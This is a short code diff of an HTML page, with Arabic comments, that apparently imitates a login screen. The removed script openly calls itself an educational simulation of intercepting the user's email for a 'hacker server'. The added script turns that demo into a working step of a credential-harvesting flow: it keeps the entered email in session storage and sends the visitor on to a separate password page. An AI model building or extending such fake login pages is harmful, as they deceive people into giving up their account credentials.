@@ -66,15 +66,21 @@
         </div>
     </div>
 
-    <script>
-        // سكريبت بسيط لمحاكاة إرسال البيانات (لأغراض تعليمية)
-        document.getElementById('nextBtn').addEventListener('click', function() {
-            const email = document.getElementById('id_email').value;
-            if(email) {
-                console.log("تم اعتراض البيانات: " + email);
-                alert("تقنياً، هنا يتم إرسال الإيميل لـ 'سيرفر الهكر' قبل نقلك لصفحة الباسورد.");
-            }
-        });
-    </script>
+<script>
+    document.getElementById('nextBtn').addEventListener('click', function() {
+        const email = document.getElementById('id_email').value;
+        
+        // التحقق من أن الحقل ليس فارغاً
+        if(email) {
+            // تخزين الإيميل في ذاكرة المتصفح المؤقتة لنقله لصفحة الباسورد
+            sessionStorage.setItem('temp_email', email);
+            
+            // التوجه لصفحة الباسورد (يجب أن يكون الملف بنفس الاسم وفي نفس المجلد)
+            window.location.href = 'password.html'; 
+        } else {
+            alert("الرجاء إدخال البريد الإلكتروني أو الهاتف");
+        }
+    });
+</script>
 </body>
 </html>
